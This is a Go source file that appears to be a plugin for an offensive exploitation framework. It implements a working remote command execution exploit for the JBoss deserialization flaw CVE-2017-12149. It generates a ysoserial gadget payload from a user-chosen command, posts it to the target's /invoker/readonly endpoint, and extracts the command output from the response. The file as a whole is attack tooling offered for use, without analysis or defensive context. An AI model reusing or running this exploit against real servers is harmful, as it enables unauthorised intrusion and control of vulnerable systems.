package exp_Jboss

import (
	"github.com/lz520520/railgunlib/pkg/gadgets"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"regexp"
)

type Exp_CVE_2017_12149 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2017_12149) parserSimpleCmdResult(rawResult string) (parserResult string, err error) {

	pattern := "(?s)======(.+)======"
	tmpSlice := regexp.MustCompile(pattern).FindStringSubmatch(rawResult)
	if len(tmpSlice) > 1 {
		parserResult = tmpSlice[1]
	}
	return parserResult, nil
}

func (self *Exp_CVE_2017_12149) Attack_cmd1() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	payload := gadgets.YsoserialPayloadGenerator(self.MustGetStringParam("gadget"), self.MustGetStringParam("cmd"))
	target := goutils.AppendUri(self.Params.BaseParam.Target, "/invoker/readonly")

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(target, string(payload), headers)
	//httpresp := base.HttpPost(target, string(payload), headers, self.Params.Settings.Charset, self.Params.Timeout, self.Params.Proxy, self.Params.Chunked)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}

	expResult.RawResult = httpresp.RawFullResp
	result, err := self.parserSimpleCmdResult(httpresp.Body)
	if err != nil {
		expResult.Err = err.Error()
	} else {
		expResult.Result = result
	}
	if result != "" {
		expResult.Status = true
	}
	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_CVE_2017_12149{}, "exp_CVE_2017_12149.yml")

}
